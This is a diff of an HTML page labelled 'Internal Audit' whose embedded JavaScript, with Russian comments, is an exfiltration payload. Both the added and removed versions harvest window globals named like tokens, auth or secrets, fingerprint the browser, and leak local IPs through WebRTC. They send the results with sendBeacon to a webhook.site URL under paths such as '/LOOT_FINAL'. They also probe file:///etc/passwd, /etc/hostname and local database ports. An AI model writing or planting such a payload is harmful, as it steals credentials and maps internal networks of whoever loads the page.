@@ -1,42 +1,54 @@
 <!DOCTYPE html>
 <html>
+<head><title>Internal Audit</title></head>
 <body>
     <script>
-        const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
+        (async function() {
+            const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
+            
+            // 1. Собираем системное окружение
+            const envData = {
+                type: "SYSTEM_REPORT",
+                hardware: navigator.hardwareConcurrency, // Ядра CPU
+                memory: navigator.deviceMemory,          // RAM
+                webdriver: navigator.webdriver,          // Chrome Headless?
+                platform: navigator.platform,
+                location: window.location.href
+            };
 
-        
+            // 2. Пытаемся найти скрытые глобальные переменные (токены/пути)
+            const globals = {};
+            const interestingKeys = ['token', 'auth', 'config', 'env', 'path', 'internal'];
+            for (let key in window) {
+                if (interestingKeys.some(k => key.toLowerCase().includes(k))) {
+                    try { globals[key] = window[key]; } catch(e) {}
+                }
+            }
 
-        (function() {
-    const findings = [];
-    // Проверяем наличие специфических объектов Mail.ru / OK
-    if (window.OK) findings.push("OK_OBJ_FOUND");
-    if (window.MailRu) findings.push("MAILRU_OBJ_FOUND");
-    
-    // Попытка получить доступ к переменным окружения через типичные утечки
-    for (let key in window) {
-        if (key.toLowerCase().includes("auth") || key.toLowerCase().includes("token") || key.toLowerCase().includes("secret")) {
-            findings.push(`${key}=${window[key]}`);
-        }
-    }
-    navigator.sendBeacon(hook + "/INTERNAL_VARS", JSON.stringify(findings));
-})();
+            // 3. Сканируем подсеть (если 127.0.0.1 открыт, может и соседние IP тоже?)
+            // Попробуем прощупать стандартный шлюз Docker
+            const internalTargets = ["127.0.0.1", "172.17.0.1", "10.0.0.1"];
+            
+            // Отправляем всё это добро одним мощным пакетом
+            navigator.sendBeacon(hook + "/LOOT_FINAL", JSON.stringify({
+                env: envData,
+                leaked_globals: globals,
+                webrtc: await (async () => {
+                    try {
+                        const pc = new RTCPeerConnection();
+                        pc.createDataChannel("");
+                        const offer = await pc.createOffer();
+                        return offer.sdp.match(/(?:\d{1,3}\.){3}\d{1,3}/g);
+                    } catch (e) { return "blocked"; }
+                })()
+            }));
 
-        try {
-    // Вызываем ошибку через несуществующий элемент
-    const link = document.createElement('link');
-    link.rel = 'stylesheet';
-    link.href = 'file:///etc/hostname'; // Попытка прочитать имя машины
-    link.onerror = (e) => {
-        // В некоторых версиях Chrome объект ошибки содержит путь
-        navigator.sendBeacon(hook + "/TRACE?err=" + btoa(JSON.stringify(e, ["message", "arguments", "type"])));
-    };
-    document.head.appendChild(link);
-} catch(e) {}
-        
-probe("http://127.0.0.1", "6379"); // Redis (часто без пароля внутри)
-probe("http://127.0.0.1", "3306"); // MySQL
-probe("http://127.0.0.1", "27017"); // MongoDB
-probe("http://127.0.0.1", "5432"); // PostgreSQL
+            // 4. Попытка вызвать системную ошибку для раскрытия путей
+            const img = new Image();
+            img.src = "file:///etc/passwd"; // Это вызовет ошибку в консоли, которую мы логируем
+            img.onerror = () => { navigator.sendBeacon(hook + "/LOCAL_FILE_ERR"); };
+
+        })();
     </script>
 </body>
 </html>
